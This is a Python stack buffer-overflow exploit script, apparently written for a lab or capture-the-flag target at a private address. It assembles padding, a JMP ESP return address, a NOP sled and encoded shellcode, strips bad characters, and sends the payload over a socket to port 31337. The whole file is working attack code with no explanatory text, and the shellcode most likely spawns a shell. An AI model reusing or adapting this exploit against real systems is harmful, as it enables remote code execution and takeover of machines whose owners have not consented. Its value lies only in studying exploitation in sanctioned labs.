import socket, struct
shellcode =  b""
shellcode += b"\xd9\xe8\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52"
shellcode += b"\xbd\x1b\xa2\x2a\x2f\x31\x6a\x17\x83\xc2\x04"
shellcode += b"\x03\x71\xb1\xc8\xda\x79\x5d\x8e\x25\x81\x9e"
shellcode += b"\xef\xac\x64\xaf\x2f\xca\xed\x80\x9f\x98\xa3"
shellcode += b"\x2c\x6b\xcc\x57\xa6\x19\xd9\x58\x0f\x97\x3f"
shellcode += b"\x57\x90\x84\x7c\xf6\x12\xd7\x50\xd8\x2b\x18"
shellcode += b"\xa5\x19\x6b\x45\x44\x4b\x24\x01\xfb\x7b\x41"
shellcode += b"\x5f\xc0\xf0\x19\x71\x40\xe5\xea\x70\x61\xb8"
shellcode += b"\x61\x2b\xa1\x3b\xa5\x47\xe8\x23\xaa\x62\xa2"
shellcode += b"\xd8\x18\x18\x35\x08\x51\xe1\x9a\x75\x5d\x10"
shellcode += b"\xe2\xb2\x5a\xcb\x91\xca\x98\x76\xa2\x09\xe2"
shellcode += b"\xac\x27\x89\x44\x26\x9f\x75\x74\xeb\x46\xfe"
shellcode += b"\x7a\x40\x0c\x58\x9f\x57\xc1\xd3\x9b\xdc\xe4"
shellcode += b"\x33\x2a\xa6\xc2\x97\x76\x7c\x6a\x8e\xd2\xd3"
shellcode += b"\x93\xd0\xbc\x8c\x31\x9b\x51\xd8\x4b\xc6\x3d"
shellcode += b"\x2d\x66\xf8\xbd\x39\xf1\x8b\x8f\xe6\xa9\x03"
shellcode += b"\xbc\x6f\x74\xd4\xc3\x45\xc0\x4a\x3a\x66\x31"
shellcode += b"\x43\xf9\x32\x61\xfb\x28\x3b\xea\xfb\xd5\xee"
shellcode += b"\xbd\xab\x79\x41\x7e\x1b\x3a\x31\x16\x71\xb5"
shellcode += b"\x6e\x06\x7a\x1f\x07\xad\x81\xc8\x22\x39\xbc"
shellcode += b"\x30\x5b\x3f\xbe\x63\xb2\xb6\x58\x09\xd4\x9e"
shellcode += b"\xf3\xa6\x4d\xbb\x8f\x57\x91\x11\xea\x58\x19"
shellcode += b"\x96\x0b\x16\xea\xd3\x1f\xcf\x1a\xae\x7d\x46"
shellcode += b"\x24\x04\xe9\x04\xb7\xc3\xe9\x43\xa4\x5b\xbe"
shellcode += b"\x04\x1a\x92\x2a\xb9\x05\x0c\x48\x40\xd3\x77"
shellcode += b"\xc8\x9f\x20\x79\xd1\x52\x1c\x5d\xc1\xaa\x9d"
shellcode += b"\xd9\xb5\x62\xc8\xb7\x63\xc5\xa2\x79\xdd\x9f"
shellcode += b"\x19\xd0\x89\x66\x52\xe3\xcf\x66\xbf\x95\x2f"
shellcode += b"\xd6\x16\xe0\x50\xd7\xfe\xe4\x29\x05\x9f\x0b"
shellcode += b"\xe0\x8d\xaf\x41\xa8\xa4\x27\x0c\x39\xf5\x25"
shellcode += b"\xaf\x94\x3a\x50\x2c\x1c\xc3\xa7\x2c\x55\xc6"
shellcode += b"\xec\xea\x86\xba\x7d\x9f\xa8\x69\x7d\x8a"

host, port = '10.10.155.21', 31337
newline = b'\n'
offset = 146
length = 1000
new_eip = b'BBBB'
def p32(data):
        return struct.pack("<I", data)

jmp_esp = p32(0x080414C3)
bad_chars = [
b'\x00',
b'\x0a'
]

all_chars = bytearray(range(1,256))
nop_sled = b'\x90'*10
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')
payload = b''.join([
b'A'*offset,
jmp_esp,
nop_sled,
shellcode,
b'C' * (length - offset - len(jmp_esp) - len(shellcode)),
newline,
])





with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
